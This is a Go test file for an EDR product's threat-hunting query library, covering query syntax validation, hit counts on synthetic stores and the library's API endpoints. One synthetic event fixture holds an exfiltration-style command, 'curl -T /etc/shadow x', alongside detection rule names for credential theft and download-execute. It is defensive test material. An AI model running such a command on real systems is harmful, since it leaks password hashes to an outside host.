// SPDX-License-Identifier: LicenseRef-Zyvor-Production-1.0
package edr

import (
	"path/filepath"
	"strings"
	"testing"
	"time"
)

func validateLibSyntax(t *testing.T, e LibraryQuery) {
	t.Helper()
	switch e.Language {
	case LangFQL:
		toks := strings.Fields(e.Query)
		if len(toks) == 0 {
			t.Errorf("%s: empty fql", e.ID)
		}
		for _, tok := range toks {
			kv := strings.SplitN(tok, ":", 2)
			if len(kv) != 2 || kv[1] == "" {
				t.Errorf("%s: token %q is not key:value", e.ID, tok)
				continue
			}
			switch kv[0] {
			case "host", "rule", "exe", "cmdline":
			case "severity":
				switch kv[1] {
				case "critical", "high", "medium", "low", "info":
				default:
					t.Errorf("%s: bad severity %q", e.ID, kv[1])
				}
			default:
				t.Errorf("%s: unsupported key %q", e.ID, kv[0])
			}
		}
		if got := parseHuntQuery(e.Query); len(got) == 0 {
			t.Errorf("%s: parser dropped every filter", e.ID)
		}
	case LangKQL:
		q := strings.ToLower(e.Query)
		if !strings.Contains(q, "finding") && !strings.Contains(q, "alert") && !strings.Contains(q, "deviceprocessevents") {
			t.Errorf("%s: kql names no known table", e.ID)
		}
	case LangConsole:
		if strings.TrimSpace(e.Query) == "" {
			t.Errorf("%s: empty filter", e.ID)
		}
	default:
		t.Errorf("%s: unknown language %q", e.ID, e.Language)
	}
}

// runLib executes a library query and returns the number of hits.
func runLib(store *Store, e LibraryQuery) int {
	switch e.Language {
	case LangFQL:
		f := parseHuntQuery(e.Query)
		n := 0
		for _, x := range store.List() {
			if matchHunt(x, f) {
				n++
			}
		}
		store.mu.Lock()
		for _, ev := range store.recentEvents {
			if matchHuntEvent(ev, f) {
				n++
			}
		}
		store.mu.Unlock()
		return n
	case LangKQL:
		return runKQLLite(e.Query, store)["count"].(int)
	default:
		n := 0
		q := strings.ToLower(e.Query)
		for _, x := range store.List() {
			if strings.Contains(strings.ToLower(x.Rule+" "+x.Host+" "+x.Severity), q) {
				n++
			}
		}
		return n
	}
}

func TestQueryLibraryRunsEverything(t *testing.T) {
	lib := QueryLibrary()
	if len(lib) < 90 {
		t.Fatalf("library too small: %d", len(lib))
	}
	seen := map[string]bool{}
	for _, e := range lib {
		if seen[e.ID] {
			t.Fatalf("duplicate id %s", e.ID)
		}
		seen[e.ID] = true
		if e.Name == "" || e.Description == "" || e.Tactic == "" || len(e.Tags) == 0 || len(e.Query) > maxQueryLen || len(e.Name) > maxNameLen {
			t.Errorf("%s: incomplete or oversized entry", e.ID)
		}
		validateLibSyntax(t, e)
	}
	empty, err := NewStore(filepath.Join(t.TempDir(), "e.jsonl"), 100)
	if err != nil {
		t.Fatal(err)
	}
	syn, _ := NewStore(filepath.Join(t.TempDir(), "s.jsonl"), 100)
	now := time.Now().UTC()
	for i, r := range []struct{ rule, sev, host, exe string }{
		{"ransomware-burst", "critical", "prod-web-1", "/tmp/x"},
		{"download-execute", "high", "db-1", "/usr/bin/curl"},
		{"persistence-attempt", "high", "node-3", "/usr/bin/crontab"},
		{"container_exec", "medium", "node-3", "/usr/bin/kubectl"},
		{"unsafe-permissions", "low", "staging-1", "/bin/bash"},
		{"script-inline-execution", "info", "ci-2", "/usr/bin/python3"},
	} {
		_ = syn.Append(Finding{ID: "f" + string(rune('a'+i)), Time: now, Host: r.host, Rule: r.rule, Severity: r.sev, Evidence: Event{Host: r.host, Executable: r.exe, Command: r.exe + " -t"}})
	}
	syn.mu.Lock()
	syn.recentEvents = append(syn.recentEvents, Event{Host: "web-1", Executable: "/usr/bin/curl", Command: "curl -T /etc/shadow x"})
	syn.mu.Unlock()
	hits := 0
	for _, e := range lib {
		if runLib(empty, e) != 0 {
			t.Errorf("%s: hits on empty store", e.ID)
		}
		if runLib(syn, e) > 0 {
			hits++
		}
	}
	t.Logf("library=%d returning results on synthetic store=%d", len(lib), hits)
	if hits == 0 {
		t.Fatal("nothing returned results")
	}
}

func TestQueryLibraryEndpoints(t *testing.T) {
	srv, _, tok := obsServer(t)
	if code, _ := wsDo(t, "GET", srv.URL+"/v1/queries/library", "", ""); code != 401 {
		t.Fatal(code)
	}
	code, body := wsDo(t, "GET", srv.URL+"/v1/queries/library?tactic=persistence&tag=cron", tok, "")
	if code != 200 || !strings.Contains(body, "pers-cron") || strings.Contains(body, "cred-shadow") {
		t.Fatal(code, body)
	}
	if code, _ := wsDo(t, "GET", srv.URL+"/v1/queries/library?q=ransomware", tok, ""); code != 200 {
		t.Fatal(code)
	}
	if code, _ := wsDo(t, "GET", srv.URL+"/v1/queries/library/nope", tok, ""); code != 404 {
		t.Fatal(code)
	}
	if code, _ := wsDo(t, "GET", srv.URL+"/v1/queries/library/pers-cron", tok, ""); code != 200 {
		t.Fatal(code)
	}
	code, body = wsDo(t, "POST", srv.URL+"/v1/queries/library/triage-critical/save", tok, "")
	if code != 201 || !strings.Contains(body, `"scope":"detections"`) || !strings.Contains(body, `"query":"critical"`) {
		t.Fatal(code, body)
	}
	_, j := wsDo(t, "GET", srv.URL+"/v1/journal", tok, "")
	if !strings.Contains(j, "saved_search.create") {
		t.Fatal(j)
	}
}
